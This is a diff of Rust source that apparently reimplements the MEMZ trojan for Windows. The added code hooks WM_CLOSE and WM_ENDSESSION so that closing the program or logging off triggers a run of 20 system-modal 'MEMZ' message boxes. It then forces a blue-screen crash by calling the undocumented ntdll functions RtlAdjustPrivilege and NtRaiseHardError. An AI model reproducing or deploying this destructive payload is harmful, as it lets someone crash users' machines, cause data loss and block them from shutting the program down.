@@ -1,17 +1,33 @@
-use std::mem::size_of_val;
+use std::{
+    mem::size_of_val,
+    thread::{self, sleep},
+    time::Duration,
+};
 
-use windows::{
-    Win32::{
-        Foundation::{BOOL, HWND, LPARAM, LRESULT, TRUE, WPARAM},
-        UI::WindowsAndMessaging::{
-            CallNextHookEx, SendMessageTimeoutW, CBT_CREATEWNDA, HCBT_CREATEWND, HHOOK,
-            SMTO_ABORTIFHUNG, SM_CXSCREEN, SM_CYSCREEN, WINDOW_STYLE, WM_GETTEXT, WM_SETTEXT,
-            WS_DLGFRAME, WS_POPUP,
-        },
+use rand::Rng;
+use windows::Win32::{
+    Foundation::{BOOL, HMODULE, HWND, LPARAM, LRESULT, NTSTATUS, TRUE, WPARAM},
+    UI::WindowsAndMessaging::{
+        CallNextHookEx, DefWindowProcA, SendMessageTimeoutW, CBT_CREATEWNDA, HCBT_CREATEWND, HHOOK,
+        MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, SMTO_ABORTIFHUNG, SM_CXSCREEN, SM_CYSCREEN, WH_CBT,
+        WINDOW_STYLE, WM_CLOSE, WM_ENDSESSION, WM_GETTEXT, WM_SETTEXT, WS_DLGFRAME, WS_POPUP,
     },
 };
 
-use crate::{wrap_windows_api::wrap_get_system_metrics, GMEM_ZEROINIT};
+use crate::{
+    convert_str::ToPCSTRWrapper,
+    data::msg::MSGS,
+    ntdll::{
+        library::Library,
+        ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
+    },
+    utils::log::{write_log, LogLocation, LogType},
+    wrap_windows_api::{
+        wrap_get_current_thread_id, wrap_get_system_metrics, wrap_messagebox_a,
+        wrap_set_windows_hook_ex_a, wrap_unhook_windows_hook_ex, WinError,
+    },
+    GMEM_ZEROINIT,
+};
 
 /// # Safety
 ///
@@ -69,4 +85,96 @@ pub unsafe extern "system" fn enum_child_proc(hwnd: HWND, _lparam: LPARAM) -> BO
         );
     }
     TRUE
+}
+
+/// # Safety
+///
+/// This function is CallBack function
+/// This function should not be called before the horsemen are ready.
+pub unsafe extern "system" fn window_proc(
+    hwnd: HWND,
+    msg: u32,
+    wparam: WPARAM,
+    lparam: LPARAM,
+) -> LRESULT {
+    if msg == WM_CLOSE || msg == WM_ENDSESSION {
+        kill_windows().expect("Failed KillWindows() Proc");
+        LRESULT(0)
+    } else {
+        let res = DefWindowProcA(hwnd, msg, wparam, lparam);
+        if res.0 == 0 {
+            panic!("Failed DefWindowProcA()\n");
+        } else {
+            res
+        }
+    }
+}
+
+fn kill_windows() -> Result<(), WinError> {
+    for _ in 0..20 {
+        let rip_message_thread = thread::spawn(move || -> Result<(), WinError> {
+            let hook = wrap_set_windows_hook_ex_a(
+                WH_CBT,
+                Some(msg_box_hook),
+                HMODULE(0_isize),
+                wrap_get_current_thread_id(),
+            )?;
+            let mut rng = rand::thread_rng();
+            let random = rng.gen_range(0..=25);
+            wrap_messagebox_a(
+                HWND(Default::default()),
+                *MSGS[random as usize].to_pcstr(),
+                "MEMZ",
+                MB_OK | MB_SYSTEMMODAL | MB_ICONHAND,
+            )?;
+            wrap_unhook_windows_hook_ex(hook)?;
+            Ok(())
+        });
+        rip_message_thread.join().unwrap().unwrap();
+        sleep(Duration::from_millis(100));
+    }
+
+    kill_windows_instant()?;
+    Ok(())
+}
+
+fn kill_windows_instant() -> Result<(), WinError> {
+    // Try to force BSOD first
+    // I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
+    // This isn't even an exploit, it's just an undocumented feature.
+    let mut tmp1 = 0;
+    let mut tmp2 = 0;
+    let lib = Library::new("ntdll.dll");
+    let rtl_adjust_privilege_proc: Option<RtlAdjustPrivilegeFn> =
+        lib.get_proc("RtlAdjustPrivilege");
+
+    match rtl_adjust_privilege_proc {
+        Some(rtl_adjust_privilege) => rtl_adjust_privilege(19, 1, 0, &mut tmp1),
+        None => {
+            write_log(
+                LogType::ERROR,
+                LogLocation::LOG,
+                "Failed GetProc RtlAdjustPrivilege",
+            );
+            panic!("Failed GetProc RtlAdjustPrivilege")
+        }
+    };
+
+    let nt_raise_hard_error_proc: Option<NtRaiseHardErrorFn> = lib.get_proc("NtRaiseHardError");
+
+    match nt_raise_hard_error_proc {
+        Some(nt_raise_hard_error) => {
+            nt_raise_hard_error(NTSTATUS(0xc0000022_u32 as i32), 0, 0, 0, 6, &mut tmp2)
+        }
+        None => {
+            write_log(
+                LogType::ERROR,
+                LogLocation::LOG,
+                "Failed GetProc NtRaiseHardError",
+            );
+            panic!("Failed GetProc NtRaiseHardError")
+        }
+    };
+
+    Ok(())
 }
